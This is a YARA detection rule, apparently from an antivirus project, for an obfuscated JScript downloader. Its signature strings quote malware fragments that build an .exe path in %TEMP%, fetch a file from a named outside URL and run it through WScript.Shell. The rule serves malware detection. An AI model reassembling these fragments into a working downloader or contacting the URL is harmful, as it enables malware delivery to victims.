rule sig_20160328_8a809deef1604c1f5a46ea06bd1c9c0f {
  meta:
    description = "datamaliciousorder - file 20160328_8a809deef1604c1f5a46ea06bd1c9c0f.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "0d869ce2f5c687a0f30d5f9b117bb103e65940ffb2f84dd1c143aee830d0eff1"

  strings:
    $s1  = "function Osncl() {return Cmrkxczavq[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"fWANheFbA.exe\";};" fullword ascii
    $s2  = "Uzzoc[Pgsocuo](\"GET\", \"http://blackmountaintipis.com/mxn3aad\", false);" fullword ascii
    $s3  = "do {WScript[Esupq](Rkzbgr() * 11)} while (Uzzoc[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Onabhirp(Gygonpokgb, Fpukd){return Gygonpokgb - Fpukd;};" fullword ascii
    $s5  = "var Cmrkxczavq = function Ohjicwuu() {return WScript[Ltxdznuf](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Ujzzreksuw() {return ((Pamnuxene == true) && (Pamnuxene == Mkahkirhq)) ? 1 : Jilszlbvfo;};" fullword ascii
    $s7  = "function Jnayf(Qxwtnmsfb){Cmrkxczavq[\"Run\"](Qxwtnmsfb, Jilszlbvfo, Jilszlbvfo);};" fullword ascii
    $s8  = " while (Jribsp){" fullword ascii
    $s9  = "function Ybkmowkr(Wdpqx) {var Ggifvlm = (1, 2, 3, 4, 5, Wdpqx); return Ggifvlm;};" fullword ascii
    $s10 = "var Joaedry = false;" fullword ascii
    $s11 = "Pamnuxene = true; " fullword ascii
    $s12 = "function Valoneolvi(){return Cqbqjf;};" fullword ascii
    $s13 = "Mkahkirhq = true; " fullword ascii
    $s14 = "function Rkzbgr(){return 22;};" fullword ascii
    $s15 = "var Pamnuxene = false;" fullword ascii
    $s16 = "function Wsdkhgv(){return Ltxdznuf;};" fullword ascii
    $s17 = "var Mkahkirhq = false;" fullword ascii
    $s18 = "return Onabhirp(Vaevnwezlk, Bkeqg);" fullword ascii
    $s19 = "function Uwcgn()" fullword ascii
    $s20 = "} catch(Pdjafmesu){Jribsp = (\"asdfa\", \"fadfasdf\", \"afdafa\", 2);};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}